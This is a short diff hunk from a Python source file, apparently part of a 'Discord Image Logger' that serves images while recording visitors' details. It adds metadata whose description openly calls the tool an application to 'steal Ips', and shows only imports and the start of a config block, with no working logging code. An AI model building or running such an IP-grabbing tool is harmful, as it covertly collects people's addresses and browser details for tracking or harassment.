@@ -2,6 +2,10 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
+__app__ = "Discord Image Logger"
+__description__ = "A simple application which allows you to steal Ips"
+__verison__ = "v2.0"
+__author__ = "Sytho"
 
 config = {
     # BASE CONFIG #
